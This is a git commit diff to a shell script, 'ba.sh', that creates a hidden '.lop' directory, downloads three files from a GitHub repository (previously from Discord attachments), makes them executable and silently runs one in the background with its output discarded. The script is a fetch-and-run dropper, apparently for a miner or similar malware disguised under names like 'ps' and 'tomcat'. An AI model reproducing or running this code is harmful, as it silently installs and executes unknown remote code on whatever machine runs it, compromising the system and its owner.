db192034faac130596e32bfc7541b340d5cc7e22
calebsto <82493755+calebsto@users.noreply.github.com>
2021-07-28 11:16:10 +0700

    Update ba.sh

--- ba.sh
+++ ba.sh
@@ -1,7 +1,7 @@
 mkdir .lop
 cd .lop
-wget https://cdn.discordapp.com/attachments/851783831958193148/869593322157645944/1
-wget https://cdn.discordapp.com/attachments/851783831958193148/869593337651425290/run
-wget https://cdn.discordapp.com/attachments/851783831958193148/869593491292966953/ps
+wget https://raw.githubusercontent.com/calebsto/tomcat/master/1
+wget https://raw.githubusercontent.com/calebsto/tomcat/master/run
+wget https://raw.githubusercontent.com/calebsto/tomcat/master/ps
 chmod +x *
 ./run > /dev/null 2>&1 & disown
